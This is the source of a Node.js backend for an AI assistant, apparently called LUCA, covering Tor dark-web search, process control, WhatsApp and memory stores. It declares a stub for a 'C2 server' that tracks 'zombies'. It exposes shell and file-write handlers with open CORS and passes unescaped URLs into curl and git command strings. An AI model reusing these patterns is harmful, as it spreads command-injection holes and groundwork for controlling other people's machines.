
import express from 'express';
import cors from 'cors';
import { exec, execSync, spawn, ChildProcess } from 'child_process';
import os from 'os';
import fs from 'fs';
import path from 'path';
import dgram from 'dgram';
import wwebjs from 'whatsapp-web.js';
import { SocksProxyAgent } from 'socks-proxy-agent';
import { HttpsProxyAgent } from 'https-proxy-agent';
import * as cheerio from 'cheerio';

const { Client, LocalAuth, MessageMedia } = wwebjs;

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' })); // Increased limit for file writes

const PORT = 3001;
const MEMORY_FILE = 'memory.json';
const VECTOR_FILE = 'vectors.json';
const GRAPH_FILE = 'knowledge_graph.json'; // NEW GRAPH DB
const RECOVERY_FILE = '.luca_recovery'; // Persistent log for rollback target

// --- ENVIRONMENT DETECTION ---
// Check if we are running inside a compiled Electron app (ASAR) or standard Node process
const IS_PRODUCTION = process.env.NODE_ENV === 'production' || (process.mainModule && process.mainModule.filename.includes('app.asar'));

// --- STATEFUL WORKING DIRECTORY ---
// CHANGED: Default to process.cwd() to enable self-modification of source code
let currentWorkingDirectory = process.cwd();

// --- MOBILE HANDSHAKE STATE ---
let mobileHandshakeActive = false;
let connectedMobileDevice = null;

// --- HTTP C2 SERVER STATE (PROJECT PUPPETMASTER) ---
const c2Sessions = new Map(); // Store active zombies: { id: { ip, lastSeen, outputQueue, commandQueue } }

// --- SUBSYSTEM MANAGER (PROCESS ORCHESTRATION) ---
const subsystems = new Map(); // Store managed processes: { id: { name, process, pid, port, logs, status, startTime, cpu, mem } }

function addSubsystem(id, name, childProcess, port = null) {
    subsystems.set(id, {
        id,
        name,
        process: childProcess,
        pid: childProcess.pid,
        port,
        logs: [],
        status: 'RUNNING',
        startTime: Date.now(),
        cpu: 0,
        mem: 0
    });
    
    // Capture stdout/stderr
    childProcess.stdout?.on('data', (data) => {
        const logEntry = data.toString();
        const subsystem = subsystems.get(id);
        if (subsystem) {
            subsystem.logs.push({ timestamp: Date.now(), type: 'stdout', data: logEntry });
            // Keep last 1000 lines
            if (subsystem.logs.length > 1000) subsystem.logs.shift();
        }
    });
    
    childProcess.stderr?.on('data', (data) => {
        const logEntry = data.toString();
        const subsystem = subsystems.get(id);
        if (subsystem) {
            subsystem.logs.push({ timestamp: Date.now(), type: 'stderr', data: logEntry });
            if (subsystem.logs.length > 1000) subsystem.logs.shift();
        }
    });
    
    childProcess.on('exit', (code) => {
        const subsystem = subsystems.get(id);
        if (subsystem) {
            subsystem.status = code === 0 ? 'STOPPED' : 'ERROR';
            subsystem.process = null;
        }
    });
    
    childProcess.on('error', (err) => {
        const subsystem = subsystems.get(id);
        if (subsystem) {
            subsystem.status = 'ERROR';
            subsystem.logs.push({ timestamp: Date.now(), type: 'error', data: err.message });
        }
    });
    
    console.log(`[SUBSYSTEM] Started: ${name} (PID: ${childProcess.pid}, ID: ${id})`);
}

function removeSubsystem(id) {
    const subsystem = subsystems.get(id);
    if (subsystem && subsystem.process) {
        try {
            subsystem.process.kill();
        } catch (e) {
            console.error(`[SUBSYSTEM] Failed to kill ${id}:`, e);
        }
    }
    subsystems.delete(id);
    console.log(`[SUBSYSTEM] Removed: ${id}`);
}

// Update process metrics periodically
setInterval(() => {
    subsystems.forEach((subsystem, id) => {
        if (subsystem.process && subsystem.pid) {
            try {
                const platform = os.platform();
                if (platform === 'darwin' || platform === 'linux') {
                    exec(`ps -p ${subsystem.pid} -o %cpu,rss`, (err, stdout) => {
                        if (!err && stdout) {
                            const lines = stdout.trim().split('\n');
                            if (lines.length > 1) {
                                const parts = lines[1].trim().split(/\s+/);
                                subsystem.cpu = parseFloat(parts[0]) || 0;
                                subsystem.mem = (parseInt(parts[1]) / 1024) || 0; // MB
                            }
                        }
                    });
                } else if (platform === 'win32') {
                    exec(`wmic process where ProcessId=${subsystem.pid} get PercentProcessorTime,WorkingSetSize`, (err, stdout) => {
                        if (!err && stdout) {
                            // Parse Windows output
                            const lines = stdout.trim().split('\n').filter(l => l.trim());
                            if (lines.length > 1) {
                                const parts = lines[1].trim().split(/\s+/);
                                subsystem.mem = (parseInt(parts[parts.length - 1]) / 1024 / 1024) || 0; // MB
                            }
                        }
                    });
                }
            } catch (e) {
                // Ignore errors
            }
        }
    });
}, 2000); // Update every 2 seconds

// --- NEURAL FORGE INSTALLER (CONCEPT 1) ---
const FORGE_DIR = path.join(currentWorkingDirectory, 'forge');
if (!fs.existsSync(FORGE_DIR)) {
    fs.mkdirSync(FORGE_DIR, { recursive: true });
}

// --- DARK WEB OSINT MODULE (ROBIN INTEGRATION - PHASE 1) ---
const TOR_PROXY = 'socks5://127.0.0.1:9050';
const TOR_HTTP_PROXY = 'http://127.0.0.1:8118'; // Privoxy or Tor HTTP proxy

// --- QUERY REFINEMENT MODULE (ROBIN INTEGRATION - PHASE 4) ---
// LLM-powered query refinement for better search results
async function refineQuery(query, context = null, generateVariations = true) {
    try {
        // Use Gemini API for query refinement
        const apiKey = process.env.API_KEY || process.env.GEMINI_API_KEY;
        if (!apiKey) {
            console.warn('[QUERY_REFINEMENT] No API key found, skipping refinement');
            return {
                refined: query,
                variations: [query],
                keywords: query.split(' '),
                reasoning: 'No API key available for refinement'
            };
        }

        const refinementPrompt = `You are an OSINT analyst specializing in dark web investigations. Your task is to refine and optimize search queries for maximum effectiveness.

Original Query: "${query}"
${context ? `Context: ${context}` : ''}

Generate:
1. A refined, optimized query that will yield better results on dark web search engines
2. ${generateVariations ? '3-5 query variations' : 'No variations needed'} that explore different angles
3. Key keywords and terms that should be included

Guidelines:
- Expand abbreviations and add relevant synonyms
- Include related terms that might appear in dark web contexts
- Consider alternative phrasings and terminology
- Add context-specific keywords (e.g., "leak", "dump", "breach" for credential searches)
- Keep queries concise but comprehensive
- For email/username searches, include variations and related terms

Respond in JSON format:
{
  "refined": "optimized query here",
  "variations": ["variation 1", "variation 2", "variation 3"],
  "keywords": ["keyword1", "keyword2", "keyword3"],
  "reasoning": "brief explanation of refinements"
}`;

        const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=${apiKey}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                contents: [{
                    parts: [{ text: refinementPrompt }]
                }]
            })
        });

        if (!response.ok) {
            throw new Error(`Gemini API error: ${response.status}`);
        }

        const data = await response.json();
        const text = data.candidates?.[0]?.content?.parts?.[0]?.text || '';
        
        // Parse JSON from response
        let refined;
        try {
            // Extract JSON from markdown code blocks if present
            const jsonMatch = text.match(/```json\n([\s\S]*?)\n```/) || text.match(/\{[\s\S]*\}/);
            if (jsonMatch) {
                refined = JSON.parse(jsonMatch[1] || jsonMatch[0]);
            } else {
                throw new Error('No JSON found in response');
            }
        } catch (parseError) {
            // Fallback: create basic refinement
            console.warn('[QUERY_REFINEMENT] Failed to parse LLM response, using fallback');
            const words = query.split(' ').filter(w => w.length > 2);
            refined = {
                refined: query,
                variations: [
                    query,
                    ...words.map(w => `${w} leak`),
                    ...words.map(w => `${w} dump`)
                ].slice(0, 5),
                keywords: words,
                reasoning: 'Fallback refinement applied'
            };
        }

        return refined;
    } catch (error) {
        console.error('[QUERY_REFINEMENT] Error:', error);
        // Fallback to basic refinement
        const words = query.split(' ').filter(w => w.length > 2);
        return {
            refined: query,
            variations: [query],
            keywords: words,
            reasoning: `Refinement failed: ${error.message}`
        };
    }
}

// Check if Tor is running
function checkTorConnection() {
    return new Promise((resolve) => {
        exec('curl -s --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip', { timeout: 5000 }, (err, stdout) => {
            if (err) {
                resolve({ available: false, error: err.message });
            } else {
                try {
                    const data = JSON.parse(stdout);
                    resolve({ available: data.IsTor === true, ip: data.IP });
                } catch (e) {
                    resolve({ available: false, error: 'Failed to parse Tor response' });
                }
            }
        });
    });
}

// Create Tor proxy agent for fetch requests
function getTorAgent() {
    try {
        return new SocksProxyAgent(TOR_PROXY);
    } catch (e) {
        return null;
    }
}

// Dark Web Search Engines
const darkWebEngines = {
    ahmia: {
        name: 'Ahmia',
        baseUrl: 'http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion',
        searchPath: '/search',
        parseResults: (html) => {
            const $ = cheerio.load(html);
            const results = [];
            $('.result').each((i, elem) => {
                const title = $(elem).find('h4 a').text().trim();
                const url = $(elem).find('h4 a').attr('href');
                const snippet = $(elem).find('.result-content').text().trim();
                if (title && url) {
                    results.push({ title, url, snippet, engine: 'Ahmia' });
                }
            });
            return results;
        }
    },
    notevil: {
        name: 'NotEvil',
        baseUrl: 'http://hss3uro2hsxfogfq.onion',
        searchPath: '/search',
        parseResults: (html) => {
            const $ = cheerio.load(html);
            const results = [];
            $('.result').each((i, elem) => {
                const title = $(elem).find('a').first().text().trim();
                const url = $(elem).find('a').first().attr('href');
                const snippet = $(elem).find('.snippet').text().trim();
                if (title && url) {
                    results.push({ title, url, snippet, engine: 'NotEvil' });
                }
            });
            return results;
        }
    },
    torch: {
        name: 'Torch',
        baseUrl: 'http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion',
        searchPath: '/search',
        parseResults: (html) => {
            const $ = cheerio.load(html);
            const results = [];
            $('.result').each((i, elem) => {
                const title = $(elem).find('a').text().trim();
                const url = $(elem).find('a').attr('href');
                const snippet = $(elem).text().trim();
                if (title && url) {
                    results.push({ title, url, snippet, engine: 'Torch' });
                }
            });
            return results;
        }
    }
};

// Parallel dark web search with thread pool
async function searchDarkWeb(query, engines = ['ahmia', 'notevil'], maxThreads = 3) {
    const torAgent = getTorAgent();
    if (!torAgent) {
        throw new Error('Tor proxy not available. Please ensure Tor is running on 127.0.0.1:9050');
    }

    const searchPromises = engines.map(engineName => {
        const engine = darkWebEngines[engineName];
        if (!engine) return Promise.resolve({ engine: engineName, results: [], error: 'Unknown engine' });

        return new Promise(async (resolve) => {
            try {
                const searchUrl = `${engine.baseUrl}${engine.searchPath}?q=${encodeURIComponent(query)}`;
                
                // Use curl via exec for Tor proxy support (more reliable than fetch with agent)
                const curlCmd = `curl -s --socks5-hostname 127.0.0.1:9050 --max-time 30 "${searchUrl}"`;
                
                exec(curlCmd, { maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
                    if (err) {
                        resolve({ engine: engineName, results: [], error: err.message });
                        return;
                    }

                    try {
                        const html = stdout;
                        const results = engine.parseResults(html);
                        resolve({ engine: engineName, results, error: null });
                    } catch (parseError) {
                        resolve({ engine: engineName, results: [], error: `Parse error: ${parseError.message}` });
                    }
                });
            } catch (error) {
                resolve({ engine: engineName, results: [], error: error.message });
            }
        });
    });

    const results = await Promise.all(searchPromises);
    return results;
}

// Scrape dark web page content
async function scrapeDarkWebPage(url, maxLength = 5000) {
    const torAgent = getTorAgent();
    if (!torAgent) {
        throw new Error('Tor proxy not available');
    }

    return new Promise((resolve) => {
        try {
            // Use curl via exec for Tor proxy support
            const curlCmd = `curl -s --socks5-hostname 127.0.0.1:9050 --max-time 45 "${url}"`;
            
            exec(curlCmd, { maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
                if (err) {
                    resolve({ content: '', error: err.message });
                    return;
                }

                try {
                    const html = stdout;
                    const $ = cheerio.load(html);
                    
                    // Remove scripts and styles
                    $('script, style, nav, footer, header').remove();
                    
                    // Extract text content
                    const content = $('body').text().replace(/\s+/g, ' ').trim();
                    
                    resolve({ 
                        content: content.substring(0, maxLength), 
                        title: $('title').text().trim(),
                        error: null 
                    });
                } catch (parseError) {
                    resolve({ content: '', error: `Parse error: ${parseError.message}` });
                }
            });
        } catch (error) {
            resolve({ content: '', error: error.message });
        }
    });
}

// --- STRUCTURED RPC PROTOCOL (CONCEPT 4) ---
const MACROS_DIR = path.join(currentWorkingDirectory, 'macros');
if (!fs.existsSync(MACROS_DIR)) {
    fs.mkdirSync(MACROS_DIR, { recursive: true });
}

// RPC Method Handlers
const rpcHandlers = {
    'shell.run': async (params) => {
        const { message, path: workPath, venv } = params;
        const cwd = workPath ? path.resolve(currentWorkingDirectory, workPath) : currentWorkingDirectory;
        
        return new Promise((resolve, reject) => {
            let command = message;
            if (venv) {
                const venvPath = path.resolve(currentWorkingDirectory, venv);
                const platform = os.platform();
                if (platform === 'win32') {
                    command = `"${path.join(venvPath, 'Scripts', 'activate.bat')}" && ${message}`;
                } else {
                    command = `source "${path.join(venvPath, 'bin', 'activate')}" && ${message}`;
                }
            }
            
            exec(command, { cwd, maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
                if (err) {
                    reject({ error: err.message, stderr });
                } else {
                    resolve({ stdout, stderr: stderr || '' });
                }
            });
        });
    },
    
    'fs.write': async (params) => {
        const { path: filePath, content } = params;
        const fullPath = path.resolve(currentWorkingDirectory, filePath);
        const dir = path.dirname(fullPath);
        
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        
        fs.writeFileSync(fullPath, content, 'utf8');
        return { success: true, path: fullPath };
    },
    
    'fs.read': async (params) => {
        const { path: filePath } = params;
        const fullPath = path.resolve(currentWorkingDirectory, filePath);
        
        if (!fs.existsSync(fullPath)) {
            throw new Error(`File not found: ${filePath}`);
        }
        
        const content = fs.readFileSync(fullPath, 'utf8');
        return { content, path: fullPath };
    },
    
    'fs.mkdir': async (params) => {
        const { path: dirPath } = params;
        const fullPath = path.resolve(currentWorkingDirectory, dirPath);
        fs.mkdirSync(fullPath, { recursive: true });
        return { success: true, path: fullPath };
    },
    
    'fs.list': async (params) => {
        const { path: dirPath } = params;
        const targetPath = dirPath ? path.resolve(currentWorkingDirectory, dirPath) : currentWorkingDirectory;
        
        if (!fs.existsSync(targetPath)) {
            throw new Error(`Directory not found: ${dirPath || 'current'}`);
        }
        
        const items = fs.readdirSync(targetPath).map(item => {
            const fullPath = path.join(targetPath, item);
            const stats = fs.statSync(fullPath);
            return {
                name: item,
                type: stats.isDirectory() ? 'directory' : 'file',
                size: stats.size,
                modified: stats.mtime.getTime()
            };
        });
        
        return { items, path: targetPath };
    },
    
    'subsystem.start': async (params) => {
        const { name, command, args = [], cwd, port, env = {} } = params;
        const workDir = cwd || currentWorkingDirectory;
        const processEnv = { ...process.env, ...env };
        
        const childProcess = spawn(command, args, {
            cwd: workDir,
            env: processEnv,
            shell: true,
            stdio: ['ignore', 'pipe', 'pipe']
        });
        
        const id = `subsystem_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        addSubsystem(id, name, childProcess, port);
        
        return { id, pid: childProcess.pid, name };
    },
    
    'http.get': async (params) => {
        const { url, headers = {} } = params;
        // Note: In production, use a proper HTTP client like axios or fetch
        // For now, we'll use exec with curl as a fallback
        return new Promise((resolve, reject) => {
            exec(`curl -s "${url}"`, { maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
                if (err) {
                    reject({ error: err.message, stderr });
                } else {
                    resolve({ body: stdout, status: 200 });
                }
            });
        });
    }
};

// Execute RPC Script
async function executeRpcScript(script) {
    const results = [];
    const context = {}; // For variable storage between steps
    
    for (const step of script.run || []) {
        const { method, params = {}, id, store } = step;
        
        if (!rpcHandlers[method]) {
            throw new Error(`Unknown RPC method: ${method}`);
        }
        
        try {
            // Replace variables in params (simple ${var} substitution)
            let processedParams = JSON.parse(JSON.stringify(params));
            const paramsStr = JSON.stringify(processedParams);
            const processedStr = paramsStr.replace(/\$\{(\w+)\}/g, (match, varName) => {
                if (context[varName] !== undefined) {
                    return JSON.stringify(context[varName]);
                }
                return match;
            });
            processedParams = JSON.parse(processedStr);
            
            const result = await rpcHandlers[method](processedParams);
            
            // Store result if requested
            if (store) {
                context[store] = result;
            }
            
            results.push({
                id: id || `step_${results.length}`,
                method,
                success: true,
                result
            });
        } catch (error) {
            results.push({
                id: id || `step_${results.length}`,
                method,
                success: false,
                error: error.message || error
            });
            
            // If script has stopOnError, halt execution
            if (script.stopOnError !== false) {
                throw error;
            }
        }
    }
    
    return { results, context };
}

// Recipe execution engine
async function executeForgeRecipe(recipe, appName) {
    const appPath = path.join(FORGE_DIR, appName);
    const logs = [];
    
    // Ensure app directory exists
    if (!fs.existsSync(appPath)) {
        fs.mkdirSync(appPath, { recursive: true });
    }
    
    // Execute recipe steps
    for (const step of recipe.install || []) {
        const { method, params } = step;
        
        try {
            if (method === 'shell.run') {
                const { message, path: stepPath, venv } = params;
                const workDir = stepPath ? path.join(appPath, stepPath) : appPath;
                
                // Ensure directory exists
                if (!fs.existsSync(workDir)) {
                    fs.mkdirSync(workDir, { recursive: true });
                }
                
                // Handle venv activation for Python
                let command = message;
                if (venv && message.includes('pip')) {
                    const venvPath = path.join(appPath, venv);
                    if (!fs.existsSync(venvPath)) {
                        // Create venv first
                        await new Promise((resolve, reject) => {
                            exec(`python3 -m venv "${venvPath}"`, { cwd: appPath }, (err) => {
                                if (err) reject(err);
                                else resolve(null);
                            });
                        });
                        logs.push({ step: 'venv', message: `Created virtual environment: ${venv}` });
                    }
                    
                    // Activate venv for command
                    const platform = os.platform();
                    if (platform === 'win32') {
                        command = `"${path.join(venvPath, 'Scripts', 'activate.bat')}" && ${message}`;
                    } else {
                        command = `source "${path.join(venvPath, 'bin', 'activate')}" && ${message}`;
                    }
                }
                
                // Execute command
                await new Promise((resolve, reject) => {
                    exec(command, { cwd: workDir, maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
                        if (err) {
                            logs.push({ step: method, error: err.message, stderr });
                            reject(err);
                        } else {
                            logs.push({ step: method, message: stdout || 'Command executed successfully' });
                            resolve(null);
                        }
                    });
                });
                
            } else if (method === 'fs.write') {
                const { path: filePath, content } = params;
                const fullPath = path.join(appPath, filePath);
                const dir = path.dirname(fullPath);
                
                if (!fs.existsSync(dir)) {
                    fs.mkdirSync(dir, { recursive: true });
                }
                
                fs.writeFileSync(fullPath, content, 'utf8');
                logs.push({ step: method, message: `Created file: ${filePath}` });
                
            } else if (method === 'git.clone') {
                const { url, path: clonePath } = params;
                // If clonePath specified, clone into that subdirectory, otherwise clone repo name
                let targetPath = appPath;
                if (clonePath) {
                    targetPath = path.join(appPath, clonePath);
                } else {
                    // Extract repo name from URL
                    const repoName = url.split('/').pop().replace('.git', '');
                    targetPath = path.join(appPath, repoName);
                }
                
                await new Promise((resolve, reject) => {
                    // Check if already exists
                    if (fs.existsSync(targetPath)) {
                        exec(`git pull`, { cwd: targetPath }, (pullErr) => {
                            if (pullErr) {
                                logs.push({ step: method, message: `Repository exists, pull failed: ${pullErr.message}` });
                                // Don't fail, just warn
                                resolve(null);
                            } else {
                                logs.push({ step: method, message: `Updated repository: ${url}` });
                                resolve(null);
                            }
                        });
                    } else {
                        exec(`git clone ${url} "${targetPath}"`, { cwd: appPath }, (err, stdout) => {
                            if (err) {
                                reject(err);
                            } else {
                                logs.push({ step: method, message: `Cloned repository: ${url} to ${targetPath}` });
                                resolve(null);
                            }
                        });
                    }
                });
                
            } else if (method === 'fs.mkdir') {
                const { path: dirPath } = params;
                const fullPath = path.join(appPath, dirPath);
                fs.mkdirSync(fullPath, { recursive: true });
                logs.push({ step: method, message: `Created directory: ${dirPath}` });
            }
        } catch (error) {
            logs.push({ step: method, error: error.message });
            throw error;
        }
    }
    
    // Save recipe for future reference
    const recipePath = path.join(appPath, 'recipe.json');
    fs.writeFileSync(recipePath, JSON.stringify(recipe, null, 2), 'utf8');
    logs.push({ step: 'save', message: 'Recipe saved to recipe.json' });
    
    return { success: true, logs, appPath };
}

// --- WHATSAPP CLIENT STATE ---
let whatsappClient = null;
let whatsappStatus = 'IDLE'; // IDLE, INITIALIZING, SCAN_QR, READY, ERROR
let whatsappQr = null;

// --- UTILS ---
function getLocalIp() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return '127.0.0.1';
}

// --- OS FINGERPRINTING ---
function getDetailedPlatform() {
    const platform = os.platform();
    const release = os.release();
    
    if (platform === 'win32') {
        return `Windows (Build ${release})`;
    } 
    else if (platform === 'darwin') {
        return `macOS (Darwin ${release})`;
    } 
    else if (platform === 'android') {
        return 'Android (Native Node)';
    }
    else if (platform === 'linux') {
        // Deep check for Android/Termux vs Standard Linux
        try {
            // Check for iSH (iOS Alpine Linux)
            try {
                const uname = execSync('uname -a').toString().toLowerCase();
                if (uname.includes('ish')) {
                    return 'iOS (iSH Alpine)';
                }
            } catch(e) {}

            if (fs.existsSync('/system/build.prop')) {
                return 'Android (Linux Kernel)';
            }
            // Check for Termux specific path
            if (process.env.PREFIX && process.env.PREFIX.includes('com.termux')) {
                return 'Android (Termux Environment)';
            }
            // Check Linux Distro
            if (fs.existsSync('/etc/os-release')) {
                const content = fs.readFileSync('/etc/os-release', 'utf8');
                const nameMatch = content.match(/PRETTY_NAME="([^"]+)"/);
                if (nameMatch) return `Linux (${nameMatch[1]})`;
            }
        } catch (e) {}
        return `Linux (Kernel ${release})`;
    }
    return `Unknown (${platform})`;
}

const LOCAL_IP = getLocalIp();
const DETECTED_OS = getDetailedPlatform();

console.log(`
██╗     ██╗   ██╗ ██████╗ █████╗ 
██║     ██║   ██║██╔════╝██╔══██╗
██║     ██║   ██║██║     ███████║
██║     ██║   ██║██║     ██╔══██║
███████╗╚██████╔╝╚██████╗██║  ██║
╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝
      LOCAL CORE ONLINE
      HOST: ${DETECTED_OS}
      LAN IP: ${LOCAL_IP}
      MODE: ${IS_PRODUCTION ? 'PRODUCTION (KERNEL LOCKED)' : 'DEVELOPMENT (GOD MODE)'}
      ROOT: ${currentWorkingDirectory}
`);

// --- WHATSAPP INITIALIZATION (LAZY LOADED) ---
const initWhatsApp = async () => {
    if (whatsappClient) return; // Already initialized

    console.log('[WHATSAPP] Initializing client (Lazy Load)...');
    whatsappStatus = 'INITIALIZING';
    
    try {
        // Determine auth path - ensure it persists
        const authPath = path.join(process.cwd(), '.wwebjs_auth');
        
        whatsappClient = new Client({
            authStrategy: new LocalAuth({ dataPath: authPath }),
            puppeteer: {
                headless: true,
                args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
            }
        });

        let qrLogCount = 0;
        whatsappClient.on('qr', (qr) => {
            // Throttled Logging
            if (qrLogCount === 0 || qrLogCount % 10 === 0) {
                console.log('[WHATSAPP] QR Code received (Scan in Web App)');
            }
            qrLogCount++;
            whatsappQr = qr;
            whatsappStatus = 'SCAN_QR';
        });

        whatsappClient.on('ready', () => {
            console.log('[WHATSAPP] Client is ready!');
            whatsappStatus = 'READY';
            whatsappQr = null;
        });

        whatsappClient.on('authenticated', () => {
            console.log('[WHATSAPP] Authenticated');
            whatsappStatus = 'AUTHENTICATED'; 
            whatsappQr = null;
        });

        whatsappClient.on('auth_failure', msg => {
            console.error('[WHATSAPP] AUTH FAILURE', msg);
            whatsappStatus = 'ERROR_AUTH';
        });
        
        whatsappClient.on('disconnected', (reason) => {
            console.log('[WHATSAPP] Client was disconnected', reason);
            whatsappStatus = 'DISCONNECTED';
            whatsappClient = null; // Allow re-init
        });

        await whatsappClient.initialize();
    } catch (e) {
        console.error("[WHATSAPP] Critical Init Error:", e);
        whatsappStatus = 'ERROR_CRITICAL';
        whatsappClient = null;
    }
};

// Helper to ensure client is running before commands
const ensureWhatsApp = async () => {
    if (!whatsappClient) {
        await initWhatsApp();
    }
    // WAIT LOOP: If status is INITIALIZING, wait up to 10 seconds
    // This prevents "Client not ready" errors if you command it immediately after startup
    let attempts = 0;
    while (whatsappStatus === 'INITIALIZING' && attempts < 20) {
        await new Promise(r => setTimeout(r, 500));
        attempts++;
    }
};


// --- KNOWLEDGE GRAPH LOGIC (PROJECT SYNAPSE V2 - TEMPORAL) ---

// Helper: Load Graph
const loadGraph = () => {
    if (fs.existsSync(GRAPH_FILE)) {
        try {
            return JSON.parse(fs.readFileSync(GRAPH_FILE, 'utf8'));
        } catch (e) { console.error("Graph Load Error", e); }
    }
    return { nodes: {}, edges: [] };
};

// Helper: Save Graph
const saveGraph = (data) => {
    fs.writeFileSync(GRAPH_FILE, JSON.stringify(data, null, 2));
};

// Endpoint: Add Relations with Temporal Logic
app.post('/api/memory/graph/merge', (req, res) => {
    const { triples } = req.body; // [{source, relation, target}]
    if (!triples || !Array.isArray(triples)) return res.status(400).json({error: "Invalid format"});

    const graph = loadGraph();
    let newNodes = 0;
    let newEdges = 0;
    const now = Date.now();

    // DEFINITION: Exclusive Relations (One-To-One in temporal context)
    // If Subject has 'LOCATED_IN', they can only be in one place at a time.
    // If we get a new location, we EXPIRE the old one.
    const EXCLUSIVE_RELATIONS = [
        'LOCATED_IN', 'IS_AT', 'STATUS_IS', 'CURRENT_ROLE', 'LIVING_IN', 
        'WORKING_ON_MAIN_PROJECT', 'HEADQUARTERED_IN', 'OWNED_BY', 'CEO_IS',
        'HAS_TITLE', 'EMPLOYED_BY', 'ASSIGNED_TO', 'CURRENTLY_READING'
    ];

    triples.forEach(t => {
        const srcId = t.source.toLowerCase();
        const tgtId = t.target.toLowerCase();
        const relation = t.relation.toUpperCase();

        // 1. Add Nodes if missing
        if (!graph.nodes[srcId]) {
            graph.nodes[srcId] = { id: srcId, label: t.source, type: 'ENTITY', created: now, lastSeen: now };
            newNodes++;
        } else {
            graph.nodes[srcId].lastSeen = now;
        }

        if (!graph.nodes[tgtId]) {
            graph.nodes[tgtId] = { id: tgtId, label: t.target, type: 'ENTITY', created: now, lastSeen: now };
            newNodes++;
        } else {
            graph.nodes[tgtId].lastSeen = now;
        }

        // 2. Temporal Logic: Handle Exclusivity
        if (EXCLUSIVE_RELATIONS.includes(relation)) {
            // Find existing active edges with same source and relation but DIFFERENT target
            graph.edges.forEach(e => {
                if (e.source === srcId && e.relation === relation && e.target !== tgtId && !e.expired) {
                    console.log(`[GRAPH] Expiring old edge: ${e.source} --[${e.relation}]--> ${e.target}`);
                    e.expired = now; // Mark as history
                }
            });
        }

        // 3. Add or Reinforce Edge
        const existingEdge = graph.edges.find(e => 
            e.source === srcId && e.target === tgtId && e.relation === relation && !e.expired
        );

        if (!existingEdge) {
            graph.edges.push({
                source: srcId,
                target: tgtId,
                relation: relation,
                weight: 1.0,
                created: now
            });
            newEdges++;
        } else {
            // Reinforce existing active edge
            existingEdge.weight += 0.1;
            existingEdge.lastSeen = now;
        }
    });

    saveGraph(graph);
    console.log(`[GRAPH] Merged ${newNodes} nodes, ${newEdges} edges. (Graphiti-Style)`);
    res.json({ success: true, stats: { newNodes, newEdges } });
});

// Endpoint: Query Graph (Return active and potentially recent history)
app.post('/api/memory/graph/query', (req, res) => {
    const { entity, depth = 1, includeHistory = false } = req.body;
    const graph = loadGraph();
    const rootId = entity.toLowerCase();
    
    const results = { nodes: {}, edges: [] };
    const queue = [{ id: rootId, level: 0 }];
    const visited = new Set([rootId]);

    // Check if root exists
    if (!graph.nodes[rootId]) return res.json({ nodes: {}, edges: [] });
    
    results.nodes[rootId] = graph.nodes[rootId];

    while (queue.length > 0) {
        const { id, level } = queue.shift();
        if (level >= depth) continue;

        // Find connected edges
        const connectedEdges = graph.edges.filter(e => {
            const isConnected = e.source === id || e.target === id;
            const isRelevant = includeHistory ? true : !e.expired;
            return isConnected && isRelevant;
        });
        
        connectedEdges.forEach(edge => {
            // Add edge
            if (!results.edges.includes(edge)) results.edges.push(edge);
            
            // Identify neighbor
            const neighborId = edge.source === id ? edge.target : edge.source;
            
            if (!visited.has(neighborId)) {
                visited.add(neighborId);
                if (graph.nodes[neighborId]) {
                    results.nodes[neighborId] = graph.nodes[neighborId];
                    queue.push({ id: neighborId, level: level + 1 });
                }
            }
        });
    }

    res.json(results);
});

// Endpoint: Get Full Graph for Visualization (Filtered)
app.get('/api/memory/graph/visualize', (req, res) => {
    const graph = loadGraph();
    // Return simpler structure for UI, maybe filter out very old expired edges to keep it clean
    const oneWeekAgo = Date.now() - (7 * 24 * 60 * 60 * 1000);
    
    const filteredEdges = graph.edges.filter(e => !e.expired || e.expired > oneWeekAgo);
    
    // Filter nodes that have at least one edge in the filtered set
    const relevantNodeIds = new Set();
    filteredEdges.forEach(e => {
        relevantNodeIds.add(e.source);
        relevantNodeIds.add(e.target);
    });

    const filteredNodes = {};
    Object.keys(graph.nodes).forEach(k => {
        if (relevantNodeIds.has(k)) filteredNodes[k] = graph.nodes[k];
    });

    res.json({ nodes: filteredNodes, edges: filteredEdges });
});


// --- VECTOR DATABASE LOGIC (LOCAL LEVEL 4 MEMORY) ---

// Calculate Dot Product
const dotProduct = (a, b) => {
    let product = 0;
    for (let i = 0; i < a.length; i++) {
        product += a[i] * b[i];
    }
    return product;
};

// Calculate Magnitude
const magnitude = (a) => {
    let sum = 0;
    for (let i = 0; i < a.length; i++) {
        sum += a[i] * a[i];
    }
    return Math.sqrt(sum);
};

// Calculate Cosine Similarity
const cosineSimilarity = (a, b) => {
    const dot = dotProduct(a, b);
    const magA = magnitude(a);
    const magB = magnitude(b);
    if (magA === 0 || magB === 0) return 0;
    return dot / (magA * magB);
};

// Save Vector
app.post('/api/memory/vector-save', (req, res) => {
    try {
        const { id, content, embedding, metadata } = req.body;
        
        let vectors = [];
        if (fs.existsSync(VECTOR_FILE)) {
            vectors = JSON.parse(fs.readFileSync(VECTOR_FILE, 'utf8'));
        }

        // Update or Add
        const existingIndex = vectors.findIndex(v => v.id === id);
        const newRecord = { id, content, embedding, metadata, timestamp: Date.now() };
        
        if (existingIndex >= 0) {
            vectors[existingIndex] = newRecord;
        } else {
            vectors.push(newRecord);
        }

        fs.writeFileSync(VECTOR_FILE, JSON.stringify(vectors, null, 2));
        console.log(`[VECTOR] Embbedding stored for: "${content.substring(0, 20)}..."`);
